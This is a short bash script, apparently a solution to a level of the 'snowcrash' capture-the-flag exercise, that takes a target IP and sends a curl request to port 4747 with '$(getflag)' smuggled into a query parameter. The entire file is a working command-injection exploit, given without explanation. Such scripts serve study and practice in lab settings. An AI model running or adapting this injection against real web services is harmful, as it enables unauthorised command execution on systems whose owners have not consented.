#!/usr/bin/env bash

if [ -z $1 ]; then
	echo "Need arg (snowcrash ip)"
	exit 1;
fi

curl http://$1:4747/\?x\=$\(getflag\)